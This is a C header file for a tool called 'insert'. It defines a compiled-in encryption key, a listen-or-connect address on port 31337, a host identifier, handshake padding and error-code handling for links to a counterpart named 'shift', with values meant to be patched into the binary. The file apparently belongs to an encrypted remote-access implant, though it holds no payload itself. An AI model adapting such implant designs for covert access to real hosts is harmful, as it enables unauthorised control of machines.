/*
 * insert.h
 * Defines and such for insert
 * by J. Stuart McMurray
 * created 20150117
 * last modified 20150213
 *
 * Copyright (c) 2014 J. Stuart McMurray <kd5pbo@gmail.com>
 *
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
 * ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 * ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 */

#ifndef HAVE_INSERT_H
#define HAVE_INSERT_H

#include <pthread.h>

/*
 * COMPILED-IN VALUES
 *
 * For simplicity (tm) the following values are compiled straight into the
 * binary.  The general idea is that instead of passing flags to the command,
 * the values are edited in the binary before running with bvi or dd or
 * something along those lines.  Variable-length strings are padded on the
 * right with a nonzero number of '\0's followed by a single character to allow
 * for easier replacing when needed.
 */

/* 32-byte encryption key.  Does not have to be printable.  Bytes after the
 * 32nd byte will be ignored.  NULL bytes may be embedded in the middle of the
 * key or added to the end.  Specifying a key less than 32 bytes will likely
 * cause crashes or other unpredictable behavior. */
#define KEY "012345678901234567890123456789AB"
/* Address and port for listening (or connecting).  A leading c will cause
 * insert to connect to the address, and a leading l will cause insert to
 * listen on the address.  Note that this needs to be configured. */
#define ADDR "l0.0.0.0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0a"
#define PORT "31337\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0p"
/* Sleep time, in seconds, between calls or to wait after client disconnects,
 * zero-padded out to 8 characters */
#define SLEEPSEC "0x000001"
/* The environment variable in which to store error codes.  If this is a
 * variable that already exists in insert's environment, the first ERRLEN
 * characters after the '=' will be set to the error code listen in retvals.h.
 * If the environment variable doesn't exist (or doesn't have enough space
 * after the '='), a new environment variable will be added to insert's
 * environment with this name to contain the error code.  If both of those
 * fail, the PATH environment variable is unset. */
#define ERRVAR "SYS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0e"
#define ERRLEN 2
/* A unique string identifying this host.  May be a UUID, counter, a
 * girlfriend's name, or whatever else.  Used in the handshake to make replay
 * attacks against other hosts that much harder.  May be any length, though a
 * ridiculously long value will slow down the handshake.  Pad with \0's to
 * leave room for editing the binary, unless it's always going to be a fixed
 * length, like a UUID.  The name may not be longer than INSTALLNAMELEN bytes,
 * but may be shorter (or null-padded on the right).  Only the portion before
 * the first null byte is compared with what is sent by shift, though the
 * comparison will be done in constant time. */
#define INSTALLNAME "0001\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0i"
#define INSTALLNAMELEN 1024
/* The number of bytes of data to read (and ignore) before insert starts the
 * handshake with shift, zero-padded out to 8 characters.  It may not be
 * larger than MAXJUNKSIZE. */
#define JUNKSIZE "0x000010"
/* The maximum size of JUNKSIZE.  This is the amount of memory allocated to
 * read junk during the handshake (though only JUNKSIZE bytes will be read). */
#define MAXJUNKSIZE 1024

/*******************************************
 * Nothing below here is user-configurable *
 *******************************************/
/* Macros to stringify a define */
#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

/*
 * Global variables
 */
extern uint8_t installname[INSTALLNAMELEN];
#define KEYLEN 32 /* Max key length */
extern uint8_t key[KEYLEN];
extern int reterr; /* Error "returned" by the first tx/rx thread to error */
extern pthread_mutex_t retmtx; /* Mutex to lock reterr */
#define DIGESTLEN SHA224_DIGEST_SIZE /* Length of message digest (hash) */

/*
 * Function prototypes
 */

/* Pointer to the environment */
extern char **environ;

/* Set the environment variable specifed by ERRVAR to the absolute value of the
 * argument */
void seterr(int code);

/* Wait for shift to connect */
int peer_wait();

/* Connect to shift */
int peer_call();

/* Safely reterr to r if it's not already set */
void set_reterr(int r);


#endif /* #ifdef HAVE_INSERT_H */
